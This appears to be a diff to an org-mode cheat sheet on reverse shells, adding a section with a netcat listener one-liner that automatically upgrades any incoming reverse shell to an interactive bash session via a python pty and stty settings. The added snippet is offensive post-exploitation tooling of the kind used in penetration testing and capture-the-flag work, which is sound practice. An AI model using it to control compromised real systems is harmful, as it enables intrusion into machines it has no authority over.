@@ -1,5 +1,13 @@
 #+title: Reverse Shells
 
+* Automatically upgrade a shell
+
+By using the following listener any connecting shell will run ~python3~ to get an interactive shell, and it will instantly run ~stty raw -echo~ to make sure arrows and control characters work.
+
+#+begin_src shell
+stty raw -echo; (echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=xterm-color;echo alias ll='ls -lsaht'; echo clear; echo id;cat) | nc -lvnp 1234 && reset
+#+end_src
+
 * Upgrade a non-interactive shell
 
 ** Using python
